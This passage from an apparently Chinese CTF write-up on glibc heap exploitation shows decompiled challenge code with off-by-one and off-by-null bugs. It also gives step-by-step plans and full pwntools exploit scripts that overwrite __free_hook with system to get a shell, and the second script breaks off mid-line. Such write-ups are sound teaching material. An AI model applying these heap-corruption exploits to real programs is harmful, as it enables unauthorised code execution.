class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"size: "</span>);</span><br><span class="line">            v2 = choice(<span class="number">1</span>);</span><br><span class="line">            v4 = get_size(*((_DWORD *)&amp;chunk_size + <span class="number">4</span> * v3), v2);</span><br><span class="line">            <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"content: "</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v2);</span><br><span class="line">                v2 = read_data(chunk_array[<span class="number">2</span> * v3], v4);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">get_size</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( a1 &gt; (<span class="keyword">signed</span> <span class="keyword">int</span>)a2 )</span><br><span class="line">        <span class="keyword">return</span> a2;</span><br><span class="line">    <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )</span><br><span class="line">        LODWORD(result) = a1 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        LODWORD(result) = a1;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>add</code>功能限制最大的内存分配空间是0x100，还有一个需要注意的点，<code>add</code>功能是用<code>calloc</code>来分配内存空间的，<code>calloc</code>分配内存会事先清空内存区域，同时<b>不会从tcache中取chunk</b>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 result; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">    <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">    <span class="keyword">void</span> *v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        result = *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;chunk_status + <span class="number">4</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)i);</span><br><span class="line">        <span class="keyword">if</span> ( !(_DWORD)result )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"size: "</span>);</span><br><span class="line">        v3 = choice(v2);</span><br><span class="line">        <span class="keyword">if</span> ( v3 &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v3 &gt; <span class="number">4096</span> )</span><br><span class="line">            v3 = <span class="number">4096</span>;</span><br><span class="line">            v4 = <span class="built_in">calloc</span>(v3, <span class="number">1u</span>LL);</span><br><span class="line">            <span class="keyword">if</span> ( !v4 )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            *((_DWORD *)&amp;chunk_status + <span class="number">4</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)i) = <span class="number">1</span>;</span><br><span class="line">            *((_DWORD *)&amp;chunk_size + <span class="number">4</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)i) = v3;</span><br><span class="line">            chunk_array[<span class="number">2</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)i] = v4;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"The lowbits of heap leak check : %x\n"</span>, chunk_array[<span class="number">2</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)i] &amp; <span class="number">0xFFF</span>LL);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"the index of ticket is %d \n"</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br>主要思路就是：</p><ol><li>其实题目没有给libc，这里之所以能知道有tcache是因为<code>add</code>给了chunk的低三个字节，可以明显看出在堆地址的开头是有分配0x250字节的tcache struct的。</li><li>事先分配释放7个<code>size=0x71</code>的chunk以填满tcache，之后才能将相应的chunk放入fastbin中实现fastbin attack。</li><li>再利用<code>edit</code>功能的off by one，形成chunk overlap，修改下一个chunk的size来创造unsorted bin从而leak libc地址。</li><li>利用chunk overlap形成uaf，实现fastbin attack将<code>main_arena</code>的<code>top</code>上方布置好size，注意我分配的空间是包含了<code>__malloc_hook</code>的，所以要保持其为<code>NULL</code></li><li>再利用fastbin attack改掉<code>top</code>为<code>__free_hook-0xb58</code>，因为不太清楚<code>main_arena</code>中其他结构体信息会不会造成其他位置影响，所以其他地方尽量保持不动</li><li>不断地申请释放空间（由于chunk的数量有限制），这里其实还是利用了<code>calloc</code>不会分配tcache的特性，注意一个tcache bin被填满后一定要换一个tcache bin，否则刚free出来的chunk会放进fastbin中，再次分配不会从top chunk切。</li><li>分配到<code>__free_hook</code>上方时，将<code>system</code>写入<code>__free_hook</code>，注意<code>__free_hook</code>上方有些位置不能写入内容（有待深入了解），因为在调试的过程中发现，若某些位置被填入数据会陷入<code>__lll_lock_wait_private</code>造成死锁状态，所以其他位置用”\x00”填充就好了。</li><li>之后<code>free</code>一个包含”/bin/sh”的chunk就能触发`system(“/bin/sh”)”了。<br>我的完整exp如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"CHOICE: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>, str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"The lowbits of heap leak check : "</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recv(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"CHOICE: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"CHOICE: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index, label=<span class="string">""</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"CHOICE: "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line">    <span class="keyword">if</span> label != <span class="string">""</span>:</span><br><span class="line">        p.recvuntil(label)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line"></span><br><span class="line">unsorted_bin_offset = <span class="number">0x60</span></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">__malloc_hook_offset = <span class="number">0x3ebc30</span></span><br><span class="line">__free_hook_offset = <span class="number">0x3ed8e8</span></span><br><span class="line">realloc_offset = <span class="number">0x98c30</span></span><br><span class="line">system_offset = <span class="number">0x4f440</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    chunk = add(<span class="number">0x68</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">chunk_0 = add(<span class="number">0x58</span>)</span><br><span class="line">chunk_0 = int(chunk_0, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">chunk_1 = add(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">chunk_2 = add(<span class="number">0xF8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite size</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x58</span> + <span class="number">10</span>, <span class="string">"A"</span> * <span class="number">0x58</span> + <span class="string">"\x71"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># create unsorted bin</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0x50</span>, <span class="string">"A"</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">chunk_1 = add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">"B"</span> * <span class="number">0x18</span> + p64(<span class="number">0x501</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leave enough space</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    chunk_3 = add(<span class="number">0xF8</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free unsorted bin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">view(<span class="number">1</span>, p64(<span class="number">0x501</span>))</span><br><span class="line">main_arena = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = main_arena - unsorted_bin_offset - main_arena_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_realloc = libc_base + realloc_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk_overlap + uaf</span></span><br><span class="line">chunk_2 = add(<span class="number">0x58</span>)</span><br><span class="line">chunk_3 = add(<span class="number">0x58</span>)</span><br><span class="line">chunk_4 = add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0x58</span> + <span class="number">10</span>, <span class="string">"D"</span> * <span class="number">0x58</span> + <span class="string">"\x71"</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">chunk_3 = add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="number">0x60</span>, <span class="string">"E"</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="number">0x68</span>, <span class="string">"E"</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">chunk_4 = add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># create size area for malloc fastbin over main_arena-&gt;top_chunk</span></span><br><span class="line">chunk_5 = add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">5</span>, <span class="number">0x33</span>, <span class="string">"F"</span> * <span class="number">0x13</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) * <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># uaf again</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="number">0x68</span>, <span class="string">"E"</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(__malloc_hook))</span><br><span class="line">chunk_4 = add(<span class="number">0x68</span>)</span><br><span class="line">chunk_6 = add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">6</span>, <span class="number">0x68</span>, <span class="string">"\x00"</span> * <span class="number">0x60</span> + p64(__free_hook - <span class="number">0xb58</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># use unsorted bin</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    chunk_7 = add(<span class="number">0x100</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    chunk_7 = add(<span class="number">0xE8</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">chunk_7 = add(<span class="number">0xE8</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"\x00"</span> * <span class="number">0x70</span> + p64(libc_system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"main_arena: "</span> + hex(main_arena))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__malloc_hook: "</span> + hex(__malloc_hook))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h2 id="unsorted-bin-attack-to-create-size-over-free-hook"><a href="#unsorted-bin-attack-to-create-size-over-free-hook" class="headerlink" title="unsorted bin attack to create size over __free_hook"></a>unsorted bin attack to create size over __free_hook</h2><p>同样是打<code>__free_hook</code>，只不过这次是用fastbin attack，通过unsorted bin attack在<code>__free_hook</code>上方伪造size提供给fastbin attack进行利用。</p><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>unsorted bin attack的攻击原理这里就不再二次赘述了，可参考<a href="https://n0nop.com/2020/04/09/pwn-heap-BookWriter/#unsorted-bin-attack" target="_blank" rel="noopener">BookWriter</a>。<br><br>只是有一点需要注意，由于进行了unsorted bin attack之后，还需要保持程序的正常运行进行后续利用，所以要保证不能再出现存取unsorted bin的情况（此时unsorted bin链表已经损坏），因此要保证进行unsorted bin attack时，<code>malloc</code>申请的大小要正好等于<code>unsorted bin</code>的大小，否则会有一个unsorted bin切割后重新入链的操作，从而使程序crash掉。<br><br>同时，若unsorted bin的size是伪造的，注意该size同样必须满足unsorted bin的size约束，否则同样会crash。</p><h3 id="举例-3"><a href="#举例-3" class="headerlink" title="举例"></a>举例</h3><h4 id="Secret-Of-My-Heart"><a href="#Secret-Of-My-Heart" class="headerlink" title="Secret Of My Heart"></a>Secret Of My Heart</h4><p><code>add</code>功能中<code>set_data</code>存在明显的off by null漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">    <span class="keyword">size_t</span> v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i &gt; <span class="number">99</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Fulled !!"</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !*(_QWORD *)(chunk_array + <span class="number">0x30</span>LL * i + <span class="number">0x28</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Size of heart : "</span>);</span><br><span class="line">    v2 = (<span class="keyword">signed</span> <span class="keyword">int</span>)choice();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt; <span class="number">0x100</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Too big !"</span>);</span><br><span class="line">    set_data((<span class="keyword">size_t</span> *)(chunk_array + <span class="number">48L</span>L * i), v2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_BYTE *__<span class="function">fastcall <span class="title">set_data</span><span class="params">(<span class="keyword">size_t</span> *a1, <span class="keyword">size_t</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">size</span>; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">    *a1 = a2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Name of heart :"</span>, a2);</span><br><span class="line">    read_data(a1 + <span class="number">1</span>, <span class="number">0x20</span>u);</span><br><span class="line">    a1[<span class="number">5</span>] = (<span class="keyword">size_t</span>)<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !a1[<span class="number">5</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Allocate Error !"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"secret of my heart :"</span>, <span class="number">32L</span>L);</span><br><span class="line">    result = (_BYTE *)(a1[<span class="number">5</span>] + (<span class="keyword">signed</span> <span class="keyword">int</span>)read_data((<span class="keyword">void</span> *)a1[<span class="number">5</span>], <span class="built_in">size</span>));</span><br><span class="line">    *result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要利用思路：</p><ol><li>利用<code>add</code>中的off by null，触发unsorted bin的unlink形成chunk overlap。</li><li>利用chunk overlap先leak出libc的地址。</li><li>通过unsorted bin attack将<code>__free_hook-0x50-0x10</code>处写入<code>main_arena</code>的地址。</li><li>将<code>__free_hook-0x50-0x10</code>处写入的<code>main_arena</code>的地址的高字节<code>0x7F</code>作为size，进行fastbin attack，将<code>system</code>写入<code>__free_hook</code>。</li><li>free一个包含”/bin/sh”的chunk，getshell（本地没打通，远程打通了，有点奇怪）。<br>我的exp：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, name, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size of heart : "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Name of heart :"</span>, name)</span><br><span class="line">    p.sendafter(<span class="string">"secret of my heart :"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index, label)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index :"</span>, str(index))</span><br><span class="line">    p.recvuntil(label)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index :"</span>, str(index))</span><br><span class="line"></span><br><span class="line">unsorted_bin_offset = <span class="number">0x58</span></span><br><span class="line">main_arena_offset = <span class="number">0x3c3b20</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line"><span class="comment"># realloc_offset = libc.symbols["realloc"]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink and chunk overlap</span></span><br><span class="line">add(<span class="number">0xF8</span>, <span class="string">"AAAA"</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 0</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"BBBB"</span>, <span class="string">"BBBB"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"CCCC"</span>, <span class="string">"CCCC"</span>) <span class="comment"># chunk 2</span></span><br><span class="line">add(<span class="number">0xF8</span>, <span class="string">"DDDD"</span>, <span class="string">"DDDD"</span>) <span class="comment"># chunk 3</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"EEEE"</span>, <span class="string">"EEEE"</span>) <span class="comment"># chunk 4</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"CCCC"</span>, <span class="string">"C"</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x180</span>)) <span class="comment"># chunk 2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">add(<span class="number">0xF8</span>, <span class="string">"AAAA"</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 0</span></span><br><span class="line">view(<span class="number">1</span>, <span class="string">"Secret : "</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - unsorted_bin_offset - main_arena_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># recover the unsorted bin</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">add(<span class="number">0xE8</span>, <span class="string">"AAAA"</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 0</span></span><br><span class="line">add(<span class="number">0xF8</span>, <span class="string">"DDDD"</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) + <span class="string">"D"</span> * <span class="number">0x58</span> + p64(<span class="number">0x21</span>)) <span class="comment"># chunk 3</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span 